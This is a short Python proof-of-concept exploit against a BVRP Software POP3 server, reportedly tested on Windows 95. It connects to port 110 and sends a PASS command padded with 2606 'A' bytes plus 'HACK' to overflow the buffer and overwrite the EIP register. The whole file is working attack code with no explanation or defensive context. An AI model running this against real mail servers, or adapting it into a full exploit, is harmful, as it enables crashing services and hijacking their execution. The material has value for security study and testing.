#!/usr/bin/python
# Overwriting EIP register like a boss. Tested with a BVRP Software POP3 Server on a W95 machine.
import socket

HOST = "192.168.1.2"
PORT = 110

supreme_bytes = "A" * 2606 + "HACK"
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    r = s.recv(1024)
    print(r)

    s.send("USER root \r\n")
    r = s.recv(1024)
    print(r)

    s.send("PASS "+supreme_bytes+"\r\n")
    r = s.recv(1024)
    print(r)

except:
    print("[!] Holy shit, we've got an error while trying to connect [!]")
